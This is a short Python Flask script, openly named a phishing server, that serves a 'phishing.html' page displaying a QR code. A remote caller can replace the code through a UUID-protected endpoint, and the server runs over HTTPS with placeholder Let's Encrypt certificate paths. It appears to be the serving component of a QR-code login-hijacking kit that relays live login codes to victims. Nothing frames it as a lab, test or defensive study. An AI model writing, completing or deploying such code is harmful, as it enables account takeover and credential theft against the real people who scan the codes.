from flask import Flask, render_template, request, jsonify
import uuid
import logging
import ssl
import base64
def start_phishing_server(port, qr_image_path):
    app = Flask(__name__)
    QR_UUID = str(uuid.uuid4())
    
    @app.route("/")
    def phishing_page():
        return render_template("phishing.html", qr_image=qr_image_path)
    
    @app.route("/qrcode/<qr_uuid>", methods=["POST"])
    def update_qr(qr_uuid):
        if qr_uuid != QR_UUID:
            return jsonify({"error": "Invalid UUID"}), 403
        try:
            qr_data = request.json.get("qr_data")
            with open(qr_image_path, "wb") as f:
                f.write(base64.b64decode(qr_data.split(",")[1]))
            logging.info("QR code updated on phishing page")
            return jsonify({"status": "success"})
        except Exception as e:
            logging.error(f"Error updating QR code: {str(e)}")
            return jsonify({"error": str(e)}), 500
    
    @app.route("/check_session")
    def check_session():
        logging.info("Session check requested")
        return jsonify({"status": "checking"})
    
    # SSL context for HTTPS
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('/etc/letsencrypt/live/yourdomain.com/fullchain.pem', 
                           '/etc/letsencrypt/live/yourdomain.com/privkey.pem')
    
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, ssl_context=context)